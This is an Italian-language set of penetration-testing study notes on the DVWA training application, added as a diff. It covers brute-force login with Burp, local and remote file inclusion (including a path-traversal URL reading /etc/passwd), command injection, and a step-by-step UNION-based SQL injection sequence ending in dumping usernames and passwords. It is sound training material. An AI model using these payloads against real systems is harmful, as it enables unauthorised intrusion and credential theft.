@@ -1,0 +1,74 @@
+DVWA è una web application utile per esercitazioni su penetration testing
+GOBUSTER: tool utile per le scansioni su web app per:
+ - DIRECTORY CONTENTS
+ - SUBDOMAINS
+ - API (ecc...)
+
+---------
+BRUTE FORCE LOGIN
+Si presetna un form con login e password e si dovrà fare un attacco di forza bruta. Un attacco di forza bruta può essere eseguito in molti modi diversi, ma consiste principalmente in un utente malintenzionato che configura valori predeterminati, tramite wordlist note o fatte 'ad hoc' ed effettua tutte le possibili combinazioni.
+BURP: applicazione che funziona come WEB PROXY per le richieste HTTP, permette al pentester di avere una gestione avanzata degli attacchi su un determinato applicativo web.
+Burp si frappone tra il browser e il server dell'applicativo web con il proprio http proxy.
+Proxy -> Intercept -> Intercept ON
+Usando il browser suggerito da Burp allora entriamo su DVWA e proviamo a inserire "prova" "prova" nel Brute Forcing attack, viene intercettata la richiesta GET da burp
+
+
+---------
+FILE INCLUSION
+È un tipo di vulnerabilità che permette di includere nella richiesta ad una risorsa un file locale o remoto. 
+Nel primo caso parliamo di una Local File Inclusion, e possiamo quindi "rubare" dei file sensibili dal server.
+Nel secondo caso parliamo di Remote File Inclusion, e possiamo quindi eseguire lato server vittima dei nostri file.
+
+LFI: viene fatta una GET senza nessun filtro sull'input, modificando l'url si può accedere. 
+PATH TRAVERSAL: è una LFI che ci permette di sacalare la gerarchia delle cartelle e ritrovare altri file in altre posizioni del file system.
+"http://dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"
+In questo modo riesco ad accedere alla cartella passwd
+
+RFI: seguendo lo stesso ragionamentpo, dal momento che la pagina esegue una GET diretta, è possibile includere non soltanto un file locale ma anche un file remoto.
+Creo un file "text.php" e lancio il comando "python3 -m http.server 8081"
+Se cerco la pagina "http://localhost:8081" accedo alla directory
+-------------
+COMMAND INJECTION:
+È presente un form dove possiamo inserire un IP su cui fare un ping.
+Guardando il sorgente possiamo notare come non venga fatto nessun filtro sull'input, ma viene eseguito con l'ecex di php.
+-------------
+SQL INJECTION:
+Un attacco SQL Injection consiste nell'inserimento o "iniezione" di una query SQL tramite i dati di in put dal client all'applicazione.
+Un exploit di SQL Injection può leggere dati sensibili dal database, modificare i dati del database, eseguire operazioni di amministrazione sul database, recuperare il contenuto di un dato file presente sul file DBMS sistema e in alcuni asi inviare comandi al sistema operativo.
+Se scrivo : ' OR '' = ' la query risultante sarà:
+SELECT * FROM ... WHERE ID = '' OR '' = '' che è sempre vero perché '' è sempre uguale a ''
+
+UNION BASED: tecnica cui lo scopo è quello di unire alla query di sistema nel quale si fa l'injection un'altra query tramite una UNION in modo tale che si possa poi eseguire delle query a piacere.
+La prima cosa da fare è identificare il numero di colonne da selezionare.
+Questo perché con la UNION dobbiamo fare una query con lo stesso numero di colonne.
+Ci sono due modi per farlo
+1) NULL STATEMENT: eseguiamo la seconda select con una serie di NULL fino a quando non ci viene restituito più l'errore.
+' union select NULL # -> errore
+' union select NULL,NULL # -> non da più errore, allora abbiamo due colonne
+2) GROUP BY
+
+Con la seconda query possiamo ottenere le informazioni che vogliamo
+' union select NULL, @@version #
+'union select NULL, @@hostname#
+
+Recuperare il database corrente:
+' union select NULL, database() # -> restituisce "dvwa" 
+
+Enumeriamo le tabelle :
+' union select null, schema_name from information_schema.schemata #
+
+Enumeriamo le colonne:
+' union select null, table_name from information_schema.tables #
+
+Enumeriamo le colonne:
+' union select null, colomn_name from information_schema.columns where table_name = 'users' #
+
+Selezioniamo username e passwords
+' union select user, password from users #
+------------
+XSS
+È una vulnerabilità che consente agli attaccanti di inserire il proprio lato client codice (normalmente Javascript) in siti web o applicazioni web.
+Una volta ricevuto, questo codice dannoso, insieme alle pagine Web originali visualizzati nel client Web, consentono agli aggressori di ottenere informazioni o eseguire tutto ciò che è in scope da javascript sul browser della vittima.
+
+
+
